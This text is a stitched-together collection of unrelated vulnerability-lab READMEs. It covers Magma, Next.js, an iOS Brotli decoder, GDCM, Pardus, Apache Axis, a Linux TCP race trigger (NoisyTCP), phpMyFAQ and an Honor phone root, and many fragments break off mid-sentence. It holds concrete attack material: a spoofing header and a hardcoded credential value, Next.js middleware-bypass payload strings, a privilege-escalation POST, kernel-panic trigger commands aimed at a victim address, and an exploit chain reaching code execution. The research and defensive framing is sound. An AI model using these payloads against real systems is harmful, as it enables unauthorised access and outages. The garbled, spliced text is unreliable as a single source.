# CVE-2026-129360 — Magma orc8r Obsidian REST: the operator identity follows the spoofable `X-Magma-Client-Cert-Serial` header

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Research status: validated](https://img.shields.io/badge/research-validated%20differential-success.svg)](#5-expected-results)

| | |
| --- | --- |
| **CVE** | CVE-2026-129360 |
| **Component** | Linux Foundation Magma orc8r — `orc8r/cloud/go/services/obsidian/access/operator.go` (`getOperator`) behind `CertificateMiddleware` (`rest_middleware.go`) |
| **Affected** | Magma ≤ 1.9.0 (logic unchanged in master at lab time) |
| **Fixed in** | nothing upstream at the time of this laboratory; the fixed side is a hash-checked synthetic remediation (documented as such) |
| **CWE** | CWE-290 (Authentication Bypass by Spoofing) |
| **Impact** | Operator impersonation on the NMS/obsidian REST tier: a caller who knows (or guesses) a registered operator certificate serial authenticates as that operator with nothing but a header — certificate serials are not secret, and no certificate possession is checked |
| **Vector** | Network — an HTTP request carrying `X-Magma-Client-Cert-Serial: <registered operator serial>` |
| **Trigger** | the header value alone; unknown serials are rejected through the real certifier lookup |

The obsidian REST tier resolves the caller's identity from a header:

```go
// orc8r/cloud/go/services/obsidian/access/operator.go
csn := req.Header.Get(CLIENT_CERT_SN_KEY)            // attacker-controlled header
certInfo, err := certifier.GetCertificateIdentity(req.Context(), csn)
...
return certInfo.Id, nil                               // operator identity
```

The design assumes a trusted TLS-terminating proxy injects that header
from the **verified** client certificate. When the header is reachable
by the client (direct service exposure, a proxy that forwards
client-supplied headers, or any topology where the assumption breaks),
knowing a registered operator **serial** — which is not a secret — is
the whole authentication. This laboratory runs the **real**
`CertificateMiddleware` behind the **real** certifier client against a
certifier gRPC server implementing the **real** protobuf service with
one registered operator certificate, and proves the spoof: t

# CVE-2026-129359 — Magma orc8r: the hardcoded inter-service credential `7ZZXAF7CAETF241KL22B8YRR7B5UF401` authenticates any gRPC caller as a trusted internal cloud service

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

| **CVE** | CVE-2026-129359 |
| **Component** | Linux Foundation Magma orc8r — `orc8r/lib/go/registry/interceptors.go` (the constant) and `orc8r/cloud/go/service/middleware/unary/identity_decorator.go` (the accepting check) |
| **Affected** | Magma ≤ 1.9.0 (the constant and the accepting branch are unchanged in master) |
| **Fixed in** | nothing upstream at the time of this laboratory; the fixed side here is a hash-checked one-line synthetic remediation (documented as such) |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **Impact** | Authentication bypass at the orc8r gRPC tier: any network client that can reach an orchestrator service port and knows the public constant is treated as a trusted internal cloud call — the same trust level as an in-cluster service, with no certificate, no identity, and no lookup |
| **Vector** | Network — a gRPC call carrying `x-magma-client-cert-serial: 7ZZXAF7CAETF241KL22B8YRR7B5UF401` |
| **Trigger** | the exact constant; every other serial goes through the real certifier lookup and is rejected when unknown |

Magma's cloud services authenticate each other with a shared secret that
was never secret: the constant
`ORC8R_CLIENT_CERT_VALUE = "7ZZXAF7CAETF241KL22B8YRR7B5UF401"` ships in
the public source, is attached by internal clients to every inter-service
call, and — on the server side — is accepted verbatim with zero
verification:

```go
// orc8r/lib/go/registry/interceptors.go
ORC8R_CLIENT_CERT_VALUE = "7ZZXAF7CAETF241KL22B8YRR7B5UF401"   // public since 2020

// orc8r/cloud/go/service/middleware/unary/identity_decorator.go
func findIdentityFromUniqueCSN(ctx context.Context, sn string, ...) {
    if sn == registry.ORC8R_CLIENT_CERT_VALUE {
        return newCtx, nil        // trusted internal cloud call — no lookup
    }
    ...                          // every other serial: real certifier lookup
```

# Changelog

All notable changes to this project are listed here. Versions follow semantic versioning.

## Unreleased

### Security

- **fleet checks the host ssh will actually reach, through your ssh config, and its jump hosts, and pins it.**

  What was wrong: the gate checked the destination as written (or the system resolver's answer for it), while ssh applied `HostName`, `Match`, `ProxyJump` and `ProxyCommand` from the operator's ssh config, which the gate never read. With `--scope 10.0.0.0/24`, `db-01` (resolver: 10.0.0.7, config: `HostName 198.51.100.9`) and `10.0.0.5` (config: `ProxyJump jump.example.test`) were both listed as in scope and both sessions were started, to hosts outside the scope. A host covered through a network entry was also resolved again by ssh, so the session was not tied to the checked address. Jump hosts were never checked at all, and ssh's own `ProxyJump` passes only `-l`, `-p`, `-J`, `-F` and `-v` to a hop, so every hop ran without `BatchMode` and the other options the tool gives the session.

  What changed: before the gate, `modes.vet_fleet_target` runs the configured ssh binary with `-G` (no connection; 10 second timeout, 64 KiB of output) and the session's own options and command, and checks the `hostname` it reports. That hostname must be a plain address or a plain name (see the entry on trailing dots). A hostname covered by name is left to ssh. One covered only through a network entry is resolved once and the session is pinned with `-o HostName=<address> -o HostKeyAlias=<hostname> -o StrictHostKeyChecking=yes` (the alias is port-qualified for a port other than 22, or is the configured alias), so host key checking looks for the name and a key not already known fails instead of being trusted on first use. `ssh -G` is run again with the pin and that answer is checked, because a `Match host` block keyed on the address can add a `ProxyJump` only then. # nextjs-middleware-bypass-lab

A **reproducible local lab** and **detection toolkit** for **CVE-2025-29927** —
the Next.js middleware authorization bypass (GHSA-f82v-jwr5-mffw, CVSS 9.1
Critical).

It does four things, all offline and on software you run yourself:

1. **Reproduces** the bypass against the real vulnerable release (`next@14.2.24`).
2. **Proves the fix** on the real patched release (`next@14.2.25`).
3. **Detects** exploitation attempts in web/proxy logs (a Sigma rule + a scanner).
4. **Audits** your manifests/lockfiles for vulnerable `next` versions, mapped to
   the advisory's exact ranges.

A pytest harness boots both real apps over HTTP and asserts *bypass-before /
blocked-after*, so the claim is demonstrated, not described.

> ⚠️ **Lab only.** The vulnerable app intentionally allows an authentication
> bypass. Run it on localhost; never expose it to a network. This project sends
> no traffic to any system you do not own.

---

## The business problem

Next.js middleware (`middleware.js`) is the natural place teams put
authentication and authorization gates: it runs before every matched route, so
"redirect to /login unless you have a session" lives there. CVE-2025-29927 lets
an **unauthenticated** attacker skip middleware entirely by sending one crafted
request header, turning that gate into no gate at all. It's CVSS 9.1 with an EPSS
in the 99th percentile — i.e. mass exploitation in the wild — so defenders need
to (a) find vulnerable apps fast and (b) spot exploitation in their logs.

## Intended users

- **SOC / detection engineers** who need log-based detection for exploitation
  attempts and a safe lab to generate realistic signal.
- **AppSec / platform engineers** verifying remediation across a fleet and
  wanting a CI gate that fails on vulnerable `next` versions.
- **Engineers / students** who want to understand the bug hands-on without
  touching anyone else's systems.

## How it improves the workflow

Instead of reading a blog post and hoping, a defender gets: a one-command demo
that shows the exact request and its effect; a dependency auditor they can drop
into CI; a log detector and Sigma rule they can wire into a SIEM; and a
regression test that proves their patched build is actually safe.

## Existing solutions reviewed, and the gap

Verified against primary sources (see [Sources](#sources)):

- **Official advisory (GHSA-f82v-jwr5-mffw)** and **patch PR vercel/next.js#77202**
  — authoritative on versions and the fix, but ship no lab, no regression test,
  and no detection content.
- **Public PoCs** (single-curl gists, exploit repos) — show the request, but
  don't package a before/after regression harness on the real versions, don't
  ship log detection, and don't audit lockfiles against the advisory ranges.
- **Generic SCA tools** flag the vulnerable version, but give you no running
  reproduction, no log-level detection, and no explanation tied to the mechanism.

**The gap this fills:** one honest, self-contained package that reproduces on the
real vulnerable version, proves the real patch, detects exploitation in logs, and
audits dependencies — with passing tests and CI.

## How the vulnerability works

Next.js uses an internal header, `x-middleware-subrequest`, to prevent its own
middleware from recursing during internal subrequests. The affected runtime
trusts that header on **inbound** requests too. When the header value repeats the
middleware module name enough times, the runtime hits its recursion-depth guard
(threshold **5**) and **skips middleware**. The exact payload depends on where
the middleware file lives:

| Next.js line | Payload value |
|---|---|
| 13.2+ (root `middleware`) | `middleware:middleware:middleware:middleware:middleware` |
| with `src/` dir | `src/middleware:src/middleware:...` (×5) |
| ≤12

# BrotliLab

In-app research harness for **CVE-2026-111497** (Brotli / Apple `libcompression`) on iOS.

No Safari, no captive portal. Triggers are fed through `compression_stream` (default) or a loopback `URLSession` → CFNetwork path.

## What’s done so far

All of this was checked on a real device running **iOS 27.0.1** (`libcompression` build **24A446**):

1. **We can crash / corrupt the decoder on purpose**  
   Bad Brotli input makes Apple’s decoder walk off the end of a small internal buffer and write into its own state.

2. **We can aim that write**  
   After parking the decoder in the right state, one short follow-up chunk lets us overwrite useful fields inside the decoder object — especially the ring-buffer pointer (`ring*`) and nearby pointer fields.

3. **That gives a controlled heap write**  
   Once `ring*` points where we want, later decode steps write dictionary/transform bytes through that pointer. Surviving runs show the spray page change; bad aims SIGSEGV/SIGBUS at the address we chose.

4. **We can free memory we don’t own**  
   Point `ring*` at a `malloc`’d block, then destroy the stream. Cleanup calls `free` on that pointer → **arbitrary free**.

5. **Use-after-free works in one run**  
   After destroy: freelist scribble on the dangling pointer, same-size `malloc` reclaim (address-adjacent cage), then UAF read of an attacker marker.

6. **Controlled code execution in-process**  
   Reclaim the freed slot, forge a Block header (`invoke` at `+0x10`), call through the dangling pointer → `blockStage2` → `brotli_payload()` (`*** CODE EXEC ***`, magic `0xC0DEC0DE00000001`). Still inside the app sandbox.

**In-app handoff (one run):** `BROTLI_AVD=1` (default) runs H0 AVD histogram **first** (ctx disclose), then Brotli ARBFREE → reclaim → CODE EXEC. Same process; no sandbox escape yet.

**Not done yet:** sandbox escape, kernel R/W, root, or Sileo.

# CVE-2026-129357 — Magma NMS: a read-only member of the host organization manufactures SUPERUSER accounts with one POST

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Research status: validated](https://img.shields.io/badge/research-validated%20differential-success.svg)](#5-expected-results)

| | |
| --- | --- |
| **CVE** | CVE-2026-129357 (VDB-437420) |
| **Component** | Linux Foundation Magma NMS — `nms/server/host/middleware.ts` (`hostOrgMiddleware`) and `nms/server/host/routes.ts` (`add_user`) |
| **Affected** | Magma ≤ 1.9.0 (both files byte-identical in master; single commit since 2022) |
| **Fixed in** | nothing upstream at the time of this laboratory; the fixed side is a hash-checked synthetic remediation (documented as such) |
| **CWE** | CWE-862 (Missing Authorization), CWE-269 (Improper Privilege Management) |
| **Impact** | Vertical privilege escalation to NMS SUPERUSER: any authenticated role-0 (read-only) member of the `host` organization creates SUPERUSER accounts in any organization with a single request |
| **Vector** | Network, authenticated as the lowest-privilege host-org user — `POST /host/organization/async/<org>/add_user` with `"role": 3` |
| **Trigger** | the organization of the request is resolved from the `Host` header (`host.<domain>` selects the host org); the route stores the request body's `role` verbatim |

The NMS host-organization subtree gates on "is the requesting tenant the
host organization" and nothing else: `hostOrgMiddleware` checks only
`organization.isHostOrg` (the org resolved from the `Host` header), the
subtree sits behind `access(USER)` (any authenticated member, any role),
and `add_user` writes the body's `role` straight into the Users table.
A read-only user of the host organization therefore creates SUPERUSER
accounts at will.

This laboratory runs the **real Magma NMS server** (tag v1.9.0, the
upstream node/yarn build) with its real local auth stack
(passport-local + Sequelize over Postgres — the standalone topology the
product's own compose file ships) and proves the escalation end to end:
the role-0 victim creates a SUPERUSER, and the manufactured account logs
in and lists users as SUPERUSER.

# ARK WP Scanner

ARK WP Scanner finds security vulnerabilities in WordPress plugins. It combines fast static analysis, a map of each plugin's attack surface, and a cascade of code language models that review candidate findings before a human confirms them.

It is built for **missing-guard** bugs that pattern scanners usually miss: endpoints without authentication, state-changing actions without a nonce, and request-controlled loops or resource use.

> **This project led to the discovery of three CVEs in WordPress plugins:** CVE-2026-23693, CVE-2026-23694, and CVE-2026-25863. All three are covered in the accompanying research paper.

## Discoveries

Work with ARK WP Scanner led to three previously unknown vulnerabilities in production WordPress plugins. Each was confirmed by reproduction in an isolated WordPress instance, reported through VulnCheck as the coordinating CVE Numbering Authority, and fixed by its vendor before the details were published. The paper *ARK WP Scanner: Static Analysis and Fine-Tuned Code Language Model Cascades for Zero-Day Discovery in WordPress Plugins* (Rahul Karne, 2026) presents them as case studies.

|---|---|---|---|---|---|

| [CVE-2026-23694](https://www.cve.org/CVERecord?id=CVE-2026-23694) | Aruba HiSpeed Cache | 3.0.5 | Cross-site request forgery (CWE-352) | 5.1 Medium | [CVE record](https://www.cve.org/CVERecord?id=CVE-2026-23694) |
| [CVE-2026-25863](https://www.cve.org/CVERecord?id=CVE-2026-25863) | Conditional Fields for Contact Form 7 | 2.7.3 | Improper validation of specified quantity (CWE-1284) | 8.7 High | [VulnCheck](https://www.vulncheck.com/advisories/conditional-fields-for-contact-form-7-dos-via-uncontrolled-resource-consumption) |

- **CVE-2026-23693:** an unauthenticated REST endpoint (`/wp-json/elementskit/v1/widget/mailchimp/subscribe`) accepted client-supplied Mailchimp credentials, letting any visitor use the site as an open proxy to Mailchimp.
- **CVE-2026-23694:** three administrative AJAX actions checked the user's capability but not a nonce, so a lured administrator could be made to reset settings, change cache purging, or enable `WP_DEBUG`.

3. **Model review.** A sequence of code language models reviews each candidate with its surrounding code and entry-point context, using severity-adjusted confidence thresholds.
4. **Prioritization and reporting.** Accepted findings are ranked by a weighted risk score and exported as HTML, JSON, CSV, and Excel reports, with optional CVE submission templates.

An attack-surface mapper records every AJAX action, REST route, admin-post handler, shortcode, widget, and block, along with whether each one is public and has nonce and capability checks.
2. **Aggregation.** Findings from all tools are normalized, deduplicated, and given an evidence score.
3. **Model review.** A sequence of code language models reviews each candidate with its surrounding code and entry-point context, using severity-adjusted confidence thresholds.
4. **Prioritization and reporting.** Accepted findings are ranked by a weighted risk score and exported as HTML, JSON, CSV, and Excel reports, with optional CVE submission templates.

- Python 3.10 or newer
- [ripgrep](https://github.com/BurntSushi/ripgrep) and [Semgrep](https://semgrep.dev/) on your `PATH`
- [Ollama](https://ollama.com/) for the locally served review models
- Optional: PHP and Composer for Progpilot, and [WPGarlic](https://github.com/kazet

# Fuzzing workshop | CVE-2026-3650 — GDCM file-meta VR memory leak / DoS

Grassroots DICOM (GDCM): parsing a malformed DICOM file whose **file meta information** uses 
a non-standard VR with a huge Value Length makes the parser
allocate ~4 GiB it never releases (CWE-401), exhausting memory (denial of service). CVSS v4.0 8.7.

- `GDCM-3.2.2/` — vulnerable
- `GDCM-3.2.7/` — latest

## Layout

```
build_vuln.sh      # builds GDCM-3.2.2 (ASan) -> GDCM-3.2.2/gdcmbin, then fuzzers/ -> GDCM-3.2.2/fuzzers
build_latest.sh    # same for GDCM-3.2.7 -> GDCM-3.2.7/gdcmbin
fuzzers/           # template copied into each version: fuzzer harnesses + build.sh + exploit.py
  build.sh         # builds the libFuzzer harnesses against ../gdcmbin -> fuzzers/bin/fuzz_*
  exploit.py       # writes the PoC DICOM file
  fuzz_*.cpp       # harnesses for workshop
```

## Build

```sh
./build_vuln.sh        # -> GDCM-3.2.2/gdcmbin  (+ GDCM-3.2.2/fuzzers)
./build_latest.sh      # -> GDCM-3.2.7/gdcmbin  (+ GDCM-3.2.7/fuzzers)
```

Both use GCC + AddressSanitizer (`-fsanitize=address -fno-omit-frame-pointer
-g`, Debug, examples + applications). Each script runs cmake + make itself and
then places the `fuzzers/` contents into the matching version directory.

Build the fuzzers for a version (needs clang / libFuzzer):

```sh
cd GDCM-3.2.2/fuzzers && ./build.sh      # -> bin/fuzz_*
```

## PoC

```sh
GDCM-3.2.2/fuzzers/exploit.py                           # writes the PoC
GDCM-3.2.2/gdcmbin/bin/gdcmdump poc_explicit.bin        # ~4 GiB leak
```

## Recommended command to find memory leaks

```sh
cd GDCM-3.2.2/fuzzers \
mkdir corpus \
./bin/fuzz_image_reader -ignore_ooms=1 -fork=4 -detect_leaks=1 ./corpus/
```

## Caveat: 3.2.7 does NOT fix this file-meta path

The upstream fix, commit `9d65a21` ("Fix CVE-2026-3650: reject Value Length
exceeding stream size"), only guards the **dataset-element** readers
(`ExplicitDataElement::ReadValue()`, `ImplicitDataElement::ReadValue()`,
`Fragment::ReadValue()`, `Fragment::ReadBacktrack()`), as tested by the
vendor's `TestCVE20263650` (tag `(0008,0060)`, VR `OB`, VL ≈ 1 GiB).

This PoC instead hits the **file-meta** reader
(`gdcmFileMetaInformation.cxx` → `ReadExplicitDataElement`), which the fix
never touches. Verified: the same ~4 GiB leak occurs on **both 3.2.2 and
3.2.7**. Additionally, `9d65a21` was **reverted** by `ff5886e` (regression on
`SIEMENS_MAGNETOM-12-MONO2-GDCM12-VRUN.dcm`), so 3.2.8–3.2.11 and `master`
carry no guard at all. 3.2.7 is the only tag containing the (partial) fix.

A **dataset** element PoC (`(0008,0060)`, VR `OB`, VL ≈ 4 GiB) does
discriminate: it is OOM-killed (`rc=137`) on 3.2.2 and rejected cleanly on
3.2.7.

# CVE-2026-95518 — Pardus Package Installer Package Substitution TOCTOU

Pardus Package Installer previews a selected `.deb` archive and later reopens the same pathname for privileged installation. A local attacker able to replace that file between review and installation can substitute a different package.

## PoC video

https://github.com/user-attachments/assets/2cfb9c90-b7aa-4442-98b7-2be209e79fba

## Vulnerability details

| Field | Value |
| --- | --- |
| CVE | [CVE-2026-95518](https://www.cve.org/CVERecord?id=CVE-2026-95518) |
| Vendor | TÜBİTAK BİLGEM Software Technologies Research Institute |
| Product | Pardus Package Installer |
| Affected versions (CNA) | 0.7.0 through versions before 0.7.1 |
| Tested version | 0.7.0 on Pardus GNU/Linux 25.2 (yirmibes) |
| Weakness | CWE-367 |
| CNA | TR-CERT |
| CNA CVSS v3.1 | 7.0 (High), `CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` |

Source: [official CVE JSON record](https://cveawg.mitre.org/api/cve/CVE-2026-95518).

## Root cause

`MainWindow.py` previews package metadata from the selected pathname, then passes that pathname to the privileged `Actions.py` helper through Polkit:

```text
pkexec /usr/share/pardus/pardus-package-installer/src/Actions.py install <selected.deb>
```

The helper reopens the pathname for installation without binding the archive to the object previously reviewed by the user. File identity, content digest, and expected package metadata are not verified across the authorization boundary. An atomic replacement can therefore change the installed archive while leaving its pathname unchanged.

Exploitation requires control over the selected package path, user review and installation approval, successful Polkit authorization, and replacement before the privileged helper consumes the file.

## Demonstrated impact

The PoC displayed `ozcanpng-poc-a` in the GUI, replaced the selected archive with `s3rd4r-poc-b`, and confirmed that the real privileged helper installed package B rather than package A. The inode, SHA-256, and package metadata changed after substitution.

Both test packages contain only an identity text file and no maintainer scripts. The demonstrated result is installation of an unreviewed replacement package. A malicious replacement could execute maintainer scripts as root; the supplied PoC demonstrates substitution using harmless packages.

## PoC usage

Requirements: affected Pardus Package Installer, a graphical Polkit session, Bash, sudo, dpkg/APT, coreutils, procps, and grep. Use a disposable Pardus VM; the script installs and removes test packages.

```bash
bash pardus_package_installer_package_substitution_toctou_poc.sh
```

Confirm that the GUI displays `ozcanpng-poc-a`, then press Enter in the terminal to arm the race. Click **Install** and leave the authentication dialog open until the terminal shows package B. Authorize the installation and check that `s3rd4r-poc-b` is installed while package A is absent. Press Enter at the final prompt to remove the test packages and temporary files.

## Remediation

Use a vendor release outside the CNA's affected range (the listed upper boundary is 0.7.1).

Bind installation to the exact archive reviewed by the user. Stage the archive in a root-owned private location, verify its digest and expected package metadata, and install that trusted object rather than reopening an attacker-writable pathname. Preserve file identity across review, authorization, and privileged consumption.

# CVE-2026-90436 — Apache Axis 1.x SOAP-fault unsafe reflection: lab + PoC

Reproduction lab and PoC driver for **CVE-2026-90436** (CWE-470, unsafe reflection):
an inbound SOAP `<Fault>` whose `<detail>` carries an `<exceptionName>` element makes
Apache Axis 1.x load an attacker-named classpath class with an **initializing**
`Class.forName` (static initializers run) and — when a `<detail>` data element
precedes it — construct it via its `String` constructor with attacker-controlled
data, all before the `AxisFault` type check, inside a silently-swallowed try block.

**Honest impact boundary:** on a *stock* install (Axis 1.4 webapp + Tomcat 9 + JDK 8)
the primitive fires unauthenticated on every tested URL, but there is **no
code-execution-capable `X(String)` constructor on the stock classpath** — RCE requires
a gadget deployed by the application (e.g. Spring's `ClassPathXmlApplicationContext`,
the CVE-2023-46604 gadget). Stock-classpath impact demonstrated here: arbitrary file
create/truncate (`java.io.FileWriter(String)`) and static initialization of arbitrary
classes.

- Affected: Apache Axis 1.x through 1.4 (EOL — no fixed release; fix exists only as
  upstream commit [41f3b4e8](https://github.com/apache/axis-axis1-java/commit/41f3b4e8d04e310ca81f86b92630ab2c11d608bd))
- Advisory: [oss-security 2026/11/06/12](https://www.openwall.com/lists/oss-security/2026/11/06/12) · NVD CVE-2026-90436 (CISA CVSS 9.8)
- **Exploited in the wild** since ~2026-11-13: Rapid7 MDR detected exploitation
  against Atlassian Confluence Data Center; N-able N-central is also exploited
  ([Rapid7 ETR](https://www.rapid7.com/blog/post/etr-rapid7-detected-exploitation-of-cve-2026-90436-against-atlassian-confluence-data-center-n-able-n-central-also-exploited/)).

## Mechanism (pre-fix source)

1. `SOAPFaultDetailsBuilder.setValue()` — the `<exceptionName>` text goes through
   `ClassUtils.forName(name)` (initializing load) → `builder.setFaultClass(...)`,
   with **no type check**.
2. `SOAPFaultBuilder.createFault()` (~line 164) —
   `faultClass.getConstructor(new Class[]{ ConvertWrapper(faultData.getClass()) })`
   then `con.newInstance(new Object[]{ faultData })`: the constructor runs **before**
   the `(AxisFault)` cast, and the `ClassCastException` is swallowed.
3. Ordering rules (state machine, verified live):
   - `<data xsi:type="xsd:string">…` must come **before** `<exceptionName>`;
     otherwise the `<data>` handler overwrites `faultClass` with `java.lang.String`.
   - The static-init primitive needs only `<exceptionName>` (no `<data>` element).
   - The constructor must be exactly `X(String)` — varargs `X(String...)` does not
     match, so e.g. `ProcessBuilder` is not reachable.

## Server-side reach — two independent parse paths

- **Known service:** the envelope is force-parsed before the service request flow
  runs (`AxisServer.invoke` → `initSOAPConstants` → full SAX parse → provider pivot),
  so per-service authentication handlers execute *after* the gadget already ran.
- **Unknown service:** when no service resolves, `AxisServer.invoke()`
  (`src/org/apache/axis/server/AxisServer.java:263-266`) force-parses the body via
  `getSOAPEnvelope().getFirstBody()` to complete dispatch — the gadget fires even
  though **no service is deployed at the requested URL** (`/axis/services/DoesNotExist`).
- `BodyBuilder.onStartChild()` creates a `SOAPFaultBuilder` for any
  envelope-namespaced `<Fault>` — direction-agnostic, so the fault deserializer
  normally used for responses runs while parsing a *request*.

# NoisyTCP — C trigger for CVE-2026-99288

A from-scratch C implementation of the trigger described in
[V4bel/NoisyTCP](https://github.com/V4bel/NoisyTCP), the advisory for a
pre-auth Linux kernel TCP race that was fixed by upstream commit
`4e2b3ef19e0e` ("inet: reject unhashed sockets during established lookups").

The advisory ships no exploit code, so this file is built entirely from the
mechanism it documents plus the receive path it names. It drives every
precondition of the bug against a plain TCP listener and fires the race.

Use it only against systems you own or are explicitly authorised to test. A hit
panics the kernel: on a container host that is the whole machine.

---

## 1. The bug in one paragraph

`__inet_lookup_established()` walks the TCP ehash without locks. It matches the
4-tuple, takes a reference, and only then re-checks the tuple — it never checks
whether the object it just pinned is still hashed. Request sockets live in a
`SLAB_TYPESAFE_BY_RCU` cache, so the address of a freed request socket can be
handed to the next allocation while a reader still holds that address. If the
next allocation is a SYN-cookie request for the *same* 4-tuple, the reader sees
the old `sk_hash`, a matching tuple, and a non-zero refcount (the cookie request
is published with refcount 1 by `tcp_get_cookie_sock()`), and returns an object
that is **not in ehash** and has **`rsk_listener == NULL`**. `tcp_v4_rcv()` then
evaluates `sk = req->rsk_listener; ... sk->sk_state` and faults at address
`0x12` (`skc_state` offset) inside the receive softirq.

The window between `inet_match()` and `refcount_inc_not_zero()` is a few
nanoseconds, so the reader has to be preempted exactly there. That is why the
advisory quotes 5 s – 2 min on KVM/QEMU (vCPU preemption) and ~14 hours on a
quiet bare-metal box. This tool maximises the attempt rate and exposes the
timing knobs; it cannot make the target kernel preemptible.

## 2. What the trigger needs

| # | Precondition | How the tool produces it |
|---|---|---|
| 1 | A hashed request socket **R** for tuple **T** | `SYN(T)` while the listener's SYN queue has room → `tcp_conn_request()` → `reqsk_queue_hash_req()` inserts it into ehash |
| 2 | A valid SYN cookie **C** for the same **T** | `SYN(T)` while the SYN queue is full → syncookie path → the SYN-ACK's sequence number is the cookie (valid ≈120 s, and only while a recent queue overflow is recorded) |
| 3 | Free **R** and reallocate its slab slot with the cookie request | `RST(T)` with `seq = rcv_nxt` → `tcp_check_req()` embryonic-reset path → `inet_csk_reqsk_queue_drop()` → `kmem_cache_free()`; then `ACK` carrying **C** → `cookie_v4_check()` → `tcp_get_cookie_sock()` → `inet_reqsk_alloc(..., attach_listener = false)` at the same per-CPU SLUB slot |
| 4 | A concurrent lookup of **T** in another RX context | The lookup packet is sent as two IPv4 fragments. `__skb_flow_dissect()` stops at L3 for fragments, so fragments hash on `{src,dst}` while plain packets hash on the full 4-tuple. With ≥2 RX queues or RPS this lands the lookup on a different CPU than the control packets |

The tool calibrates the target's effective backlog itself (binary search on
"does a further SYN still create a request socket?"), so it needs no knowledge
of `listen(2)`.

## 3. Build

```sh
make            # or: cc -O2 -pthread -o noisytcp noisytcp.c
```

Requirements: Linux, a C11 compiler, and root (`CAP_NET_RAW` for the raw IPv4
and `AF_PACKET` sockets). No external libraries.

The build needs the C library *headers*, which minimal cloud/container images
often ship without:

| Distro | Packages |
|---|---|
| Debian / Ubuntu | `apt-get install -y build-essential` (or just `libc6-dev`) |
| Fedora / RHEL | `dnf install -y gcc glibc-devel` |
| Alpine | `apk add build-base` |
| Arch | `pacman -S base-devel` |

If the compiler reports `fatal error: arpa/inet.h: No such file or directory`,
that is the missing `libc6-dev`/`glibc-devel` package, not a code problem.

## 4. Run

Always start with `probe`, then `verify`, then `race`.

```sh
./noisytcp --victim 192.0.2.10 --port 8080 --mode probe
./noisytcp --victim 192.0.2.10 --port 8080 --mode verify
./noisytcp --victim 192.0.2.10 --port 8080 --mode race --duration 600
```

`probe` sends one SYN and reports the SYN-ACK plus whether the host kernel
leaks RSTs (see §5). `verify` walks all five stages and prints what the target
actually did

# CVE-2026-130347 — phpMyFAQ: password-reset authentication bypass for OIDC/Keycloak/Entra ID/LDAP/SSO/WebAuthn accounts

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

| **CVE** | CVE-2026-130347 (GHSA-59x6-g992-q3fm) |
| **Component** | phpMyFAQ — `Controller/Frontend/UnauthorizedUserController.php::updatePassword()` (4.1) |
| **Affected** | phpMyFAQ before 4.1.12; 4.2.0-alpha before 4.2.0-RC.2 |
| **Fixed in** | **4.1.12** (the genuine vendor fix — this lab's fixed side) |
| **CWE** | CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), CWE-287 (Improper Authentication) |
| **Impact** | Anyone who can trigger a password reset for an externally-provisioned account — and read the reset mail (mailbox access, catch-all, DNS/mail redirection) — sets a NEW LOCAL PASSWORD on that account and logs in with username/password, skipping the IdP entirely and defeating its MFA, conditional access and deprovisioning |
| **Vector** | Network, unauthenticated — `PUT /api/user/password/update` + `POST /api/user/password/reset` (both public routes) |
| **Trigger** | one reset request naming the victim's login + on-file e-mail, then consume the signed link from the delivered mail |

When phpMyFAQ auto-provisions an account from an external identity provider
(OIDC, Keycloak, Entra ID, LDAP, SSO, WebAuthn), it stores
`auth_source='oidc'` (etc.) — **and creates a random local bcrypt hash** in
`faquserlogin` (a provisioning artifact: `User::createUser($login, '')`
replaces the empty password with `createPassword()`). The public reset flow
never inspects `auth_source`:

$expires = time() + self::RESET_TOKEN_TTL;
$signature = $this->signResetToken($user->getUserId(), $expires, $passHash);
// … the signed link is emailed to the on-file address
```

# CVE-2026-98260 · 荣耀 GT Pro (PPG-AN00) 临时 Root 实战笔记

> **设备：** 荣耀 GT Pro（PPG-AN00，骁龙 8 至尊版 / Snapdragon 8 Elite，SM8750（sun），MagicOS 10.0.0.175 C00E175R104P7）
> **内核：** `6.6.118-android15-8-gf17133276a57-abogki518694926-4k`（+pgo,+bolt，4K 页）
> **结果：** BL 全程锁定、零分区改动，取得 **uid=0 + SELinux Permissive + 常驻 su-daemon** 的临时 root，重启即清
> **性质：** 自有设备安全研究笔记。不含任何 exploit 二进制；exploit 本体来自 [TimerRoot](https://github.com/MVN123123123123123/TimerRoot)（见致谢）

---

## 0. 免责声明

- 仅在**你拥有所有权的设备**上操作。内核 exploit 有 panic 风险（本文实录一次 panic：外部进程在喷射窗口中被管道信号打断所致，自动重启恢复，无数据损失——但不保证每次如此）
- 操作违反保修条款；风险自担
- 本仓库不含 exploit 二进制/载荷，仅含**内核配置推导产物**与**自写的 daemon/客户端源码**

## 1. 一句话结论

TimerRoot（CVE-2026-98260，POSIX CPU timer UAF）的 conf 驱动架构可以在**不 root 任何东西的前提下**，仅凭出厂固件推导出全部内核常量；在荣耀 GT Pro 上 exploit 原语全通，但**荣耀的三层加固把"完整 root"压成了"uid=0 + permissive + su-daemon"**——依然实用，但有明确的能力边界。

## 2. 硬条件（一条不符就别往下走）

| 条件 | 值 |
|---|---|
| 内核版本 | 必须逐字符等于 `6.6.118-android15-8-gf17133276a57-abogki518694926-4k` |
| 固件 | 10.0.0.175 (C00E175R104P7)（推导所用完整包；该内核串在荣耀 WIN RT AAK-AN00 的 `.170`/`.175` 上相同，GKI 同串理论通用） |
| 页大小 | 4K（`abogki` 构建均为 4K） |
| BL | 锁定（荣耀无解锁渠道，本文全程不需要） |
| 工具 | TimerRoot 官方 `timer` 二进制 + 本仓库 conf；NDK（仅自编译 daemon 时需要） |

同一内核串也在 **荣耀 WIN RT（AAK-AN00 .170/.175）** 上出现——GKI 同串 = 同内核二进制，理论通用。

## 3. 为什么不是 GhostLock（CVE-2026-43499）

该内核是 **+pgo,+bolt** 编译。BOLT 重排了函数布局，GhostLock 依赖的 pselect 载波几何
